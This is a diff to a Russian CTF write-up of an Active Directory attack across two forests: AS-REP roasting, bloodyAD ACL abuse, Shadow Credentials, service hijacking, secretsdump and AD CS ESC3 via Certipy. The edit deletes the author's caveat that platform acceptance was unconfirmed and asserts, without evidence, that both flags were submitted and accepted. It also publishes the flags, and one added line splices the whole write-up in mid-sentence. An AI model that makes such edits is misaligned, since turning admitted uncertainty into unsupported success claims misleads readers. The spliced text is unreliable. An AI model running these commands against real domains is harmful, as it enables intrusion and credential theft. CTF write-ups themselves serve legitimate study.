@@ -10,7 +10,7 @@
 - CORE: `dc02.core.corp`, домен `core.corp`;
 - между лесами настроено доверие, связывающее LEGACY и CORE.
 
-Нужно было получить два отдельных флага из рабочего стола `Administrator` на каждом контроллере. Оба флага получены. Это не два варианта одного и того же трюка: на первом контроллере сработала цепочка ACL, Shadow Credentials и управления службой, на втором — межлесный trust, доступ к конфигу PKI и выдача сертификата от имени администратора (ESC3).
+Нужно было получить два отдельных флага из рабочего стола `Administrator` на каждом контроллере. **Оба флага получены, сданы и приняты платформой; задача Old Trusty засчитана.** Это не два варианта одного и того же трюка: на первом контроллере сработала цепочка ACL, Shadow Credentials и управления службой, на втором — межлесный trust, доступ к конфигу PKI и выдача сертификата от имени администратора (ESC3).
 
 Краткая карта решения:
 
@@ -23,7 +23,7 @@
 7. Выпустить сертификат Enrollment Agent, а затем сертификат Administrator по шаблону `User`, пригодный для PKINIT.
 8. Получить NT-хэш Administrator второго леса и забрать второй флаг.
 
-Исходный подробный журнал был в переданном архиве `writeups/OldTrusty/README.md`; там же имеются `FLAG1.txt` и `FLAG2.txt`, выводы Certipy, XML-конфиг и вспомогательные Python-скрипты. Ниже сохранены команды и причины выбора каждого шага. Конкретные IP, рабочие пароли, NT-хэши и полные значения флагов в публичном репозитории скрыты. За время конкурса инстанс неоднократно пересоздавался, поэтому точные адреса из разных логов не следует смешивать.
+Исходный подробный журнал был в переданном архиве `writeups/OldTrusty/README.md`; там же имеются `FLAG1.txt` и `FLAG2.txt`, выводы Certipy, XML-конфиг и вспомогательные Python-скрипты. Ниже сохранены команды и причины выбора каждого шага. Конкретные IP, рабочие пароли и NT-хэши в публичном репозитории скрыты. Полные флаги опубликованы в [`evidence/FLAG1.txt`](evidence/FLAG1.txt) и [`evidence/FLAG2.txt`](evidence/FLAG2.txt). За время конкурса инстанс неоднократно пересоздавался, поэтому точные адреса из разных логов не следует смешивать.
 
 ## 1. Разведка LEGACY: почему именно AS-REP
 
@@ -115,7 +115,130 @@ python3 services.py 'legacy/svc_ops@<dc01>' \
 secretsdump.py 'legacy.corp/<local-admin>:<password>@<dc01>' -just-dc
 ```
 
-Затем использовали хэш доменного Administrator для доступа к `C$` и чтения `Users\Administrator\Desktop\flag.txt`. Первый флаг получен и сохранён в архиве как `FLAG1.txt` (`PP{...}`). Сохранившийся снимок API не подтверждает завершение Old Trusty на платформе.
+Затем использовали хэш доменного Administrator для доступа к `C# Old Trusty: полный путь через два домена AD и AD CS
+
+[English](solve.md)
+
+## 0. Задача и план
+
+В задаче были два контроллера домена, принадлежащих разным лесам Active Directory:
+
+- LEGACY: `dc01.legacy.corp`, домен `legacy.corp`;
+- CORE: `dc02.core.corp`, домен `core.corp`;
+- между лесами настроено доверие, связывающее LEGACY и CORE.
+
+Нужно было получить два отдельных флага из рабочего стола `Administrator` на каждом контроллере. **Оба флага получены, сданы и приняты платформой; задача Old Trusty засчитана.** Это не два варианта одного и того же трюка: на первом контроллере сработала цепочка ACL, Shadow Credentials и управления службой, на втором — межлесный trust, доступ к конфигу PKI и выдача сертификата от имени администратора (ESC3).
+
+Краткая карта решения:
+
+1. На LEGACY найти доменного пользователя без Kerberos preauthentication и восстановить его пароль по AS-REP.
+2. Через BloodHound проследить права `WriteDacl`, `AddMember` и `AddKeyCredentialLink` до сервисного пользователя `svc_ops`.
+3. Через Shadow Credentials получить его NT-хэш, воспользоваться членством в `Server Operators` для управления службой и получить локального администратора на DC01.
+4. Прочитать NTDS и первый флаг.
+5. Извлечь секрет межлесного доверия, зайти в CORE через доверенную учётную запись `LEGACY$`.
+6. Найти конфиг развертывания PKI на общей шаре, получить учётку `svc_enrollment`.
+7. Выпустить сертификат Enrollment Agent, а затем сертификат Administrator по шаблону `User`, пригодный для PKINIT.
+8. Получить NT-хэш Administrator второго леса и забрать второй флаг.
+
+Исходный подробный журнал был в переданном архиве `writeups/OldTrusty/README.md`; там же имеются `FLAG1.txt` и `FLAG2.txt`, выводы Certipy, XML-конфиг и вспомогательные Python-скрипты. Ниже сохранены команды и причины выбора каждого шага. Конкретные IP, рабочие пароли и NT-хэши в публичном репозитории скрыты. Полные флаги опубликованы в [`evidence/FLAG1.txt`](evidence/FLAG1.txt) и [`evidence/FLAG2.txt`](evidence/FLAG2.txt). За время конкурса инстанс неоднократно пересоздавался, поэтому точные адреса из разных логов не следует смешивать.
+
+## 1. Разведка LEGACY: почему именно AS-REP
+
+Сначала проверили службы DC01: Kerberos 88, LDAP 389/636, SMB 445 и DNS 53. Анонимные SMB/null-сессии не дали доступа к данным, LDAP потребовал bind. Нужна была доменная учётная запись.
+
+Вместо перебора паролей на онлайн-службах проверили пользователей с отключённой предварительной аутентификацией Kerberos:
+
+```bash
+GetNPUsers.py legacy.corp/ -usersfile users.txt -no-pass -dc-ip <dc01> -format john
+john hash.txt --format=krb5asrep
+```
+
+Из AS-REP восстановили пароль пользователя `jdoe`. Важное различие: это офлайн-проверка полученного AS-REP, а не поток логинов к контроллеру. Успешный пароль затем позволил аутентифицироваться в LDAP/SMB и собрать граф прав.
+
+## 2. Цепочка ACL в BloodHound
+
+Собрали сведения об объектах и правах, загрузили в BloodHound и искали путь от `jdoe` до пользователя или группы с привилегиями на DC01. Нашлась цепочка:
+
+```text
+jdoe --WriteDacl--> Legacy App Maintainers
+     --AddMember--> Infrastructure Support
+     --AddKeyCredentialLink--> svc_ops
+svc_ops: member of Server Operators
+```
+
+`WriteDacl` позволяет изменить ACL группы, а `AddMember` — изменить её состав. Конечное `AddKeyCredentialLink` относится уже к `msDS-KeyCredentialLink` целевого пользователя: это место для Shadow Credentials.
+
+В отчёте сохранились типовые команды `bloodyAD`. DN должны соответствовать найденным доменным объектам; они намеренно показаны как переменные, а не несуществующие точные значения.
+
+```bash
+bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
+  add genericAll '<Legacy App Maintainers DN>' '<jdoe DN>'
+
+bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
+  add groupMember '<Legacy App Maintainers DN>' '<jdoe DN>'
+
+bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
+  add groupMember '<Infrastructure Support DN>' '<jdoe DN>'
+
+bloodyAD -d legacy.corp -u jdoe -p '<jdoe-password>' -H <dc01> \
+  add shadowCredentials '<svc_ops DN>' --path svc2
+```
+
+Критично понимать зависимость: переход к `svc_ops` появился благодаря графу делегированных прав, а не потому, что у `jdoe` изначально были права администратора домена.
+
+## 3. Shadow Credentials и нюанс с PFX
+
+После изменения `msDS-KeyCredentialLink` появляется возможность использовать связанную пару ключей для аутентификации `svc_ops` через сертификат. `bloodyAD` пытался сразу выполнить PKINIT, но получал `KDC_ERR_ETYPE_NOTSUPP`.
+
+Здесь было легко ошибочно решить, что вся операция не состоялась. В исходном журнале зафиксировано другое: **PFX-файл был сохранён несмотря на ошибку встроенного PKINIT**. Поэтому дальнейшую аутентификацию выполнили отдельно:
+
+```bash
+certipy-ad auth -pfx svc2.pfx \
+  -username svc_ops -domain legacy.corp -dc-ip <dc01>
+```
+
+Certipy получил NT-хэш `svc_ops`. В архиве он указан полностью; здесь вместо него используется `<svc_ops-NT>`.
+
+Зачем это нужно: пароль сервисной учётки необязателен, если есть пригодный NT-хэш для поддерживаемого метода аутентификации.
+
+## 4. Server Operators: почему не сработал psexec
+
+`svc_ops` состоял в `Server Operators`. Эта группа может управлять некоторыми службами контроллера, однако это не равно полной доступности административной SMB-шары. В попытках через `psexec` и `atexec` возникали ошибки вроде `share not writable` и `rpc_s_access_denied`.
+
+Правильным направлением стало **Service Control Manager (SCM)**, а не запись исполняемого файла на `ADMIN$`:
+
+```bash
+python3 services.py 'legacy/svc_ops@<dc01>' \
+  -hashes :<svc_ops-NT> -no-pass list
+
+python3 services.py 'legacy/svc_ops@<dc01>' \
+  -hashes :<svc_ops-NT> -no-pass change \
+  -name ReportSync \
+  -path '<one-shot service command>'
+
+python3 services.py 'legacy/svc_ops@<dc01>' \
+  -hashes :<svc_ops-NT> -no-pass start -name ReportSync
+```
+
+В сохранённом оригинале one-shot команда создавала локальную административную учётную запись и добавляла её в группу Administrators. После запуска сервиса доступ этой учётки был проверен и подтверждён. Само имя/пароль созданной учётки не публикуем.
+
+Это важный переход: членство в `Server Operators` было использовано для конфигурации запуска службы, а не для прямой записи в админскую шару.
+
+## 5. LEGACY: NTDS и первый флаг
+
+Имея локального администратора на DC01, получили доменные хэши через механизм репликации NTDS:
+
+```bash
+secretsdump.py 'legacy.corp/<local-admin>:<password>@<dc01>' -just-dc
+```
+
+ и чтения `Users\\Administrator\\Desktop\\flag.txt`. **Первый флаг (LEGACY) получен и принят платформой:**
+
+```text
+PP{d4cl-4cls-sh4d0ws-4nd-s3rv1c3s}
+```
+
+Оригинальный файл: [`evidence/FLAG1.txt`](evidence/FLAG1.txt).
 
 ## 6. CORE: почему права из LEGACY не переносились напрямую
 
@@ -224,7 +347,13 @@ use C$
 get Users\Administrator\Desktop\flag.txt
 ```
 
-**Второй флаг тоже получен.** В исходном архиве он сохранён как `evidence/FLAG2.txt` (в публичной версии `PP{...}`). Однако Old Trusty отсутствует в сохранившемся `completedChallenges` API, поэтому получение двух файлов нельзя выдавать за доказанную сдачу обоих флагов платформе.
+**Второй флаг (CORE) также получен и принят платформой:**
+
+```text
+PP{trvst-th3-c3rt1f1c4t3-ch41n}
+```
+
+Оригинальный файл: [`evidence/FLAG2.txt`](evidence/FLAG2.txt). **Оба флага успешно сданы, Old Trusty засчитана как решённая задача.**
 
 ## 12. Что ещё проверяли и почему отбросили
 
@@ -258,5 +387,7 @@ get Users\Administrator\Desktop\flag.txt
 В переданном архиве сохранены оригинальные материалы: `OldTrusty/README.md`, `OldTrusty/scripts/`, `OldTrusty/evidence/20261114032846_Certipy.txt`, `enrollment-agent.xml` и оба файла подтверждения флагов. Публичный текст исключает живые пароли и полные хэши; для воспроизведения используются собственные авторизованные доменные стенды.
 
 ## Материалы в репозитории
+
+Оригинальные принятые флаги: [`evidence/FLAG1.txt`](evidence/FLAG1.txt) и [`evidence/FLAG2.txt`](evidence/FLAG2.txt).
 
 Проверяемые исходники и очищенные материалы: [`evidence/original-notes.redacted.md`](evidence/original-notes.redacted.md), [`evidence/certipy_templates_sanitized.txt`](evidence/certipy_templates_sanitized.txt), [`evidence/enrollment-agent.xml`](evidence/enrollment-agent.xml), [`scripts/drsr_t.py`](scripts/drsr_t.py).
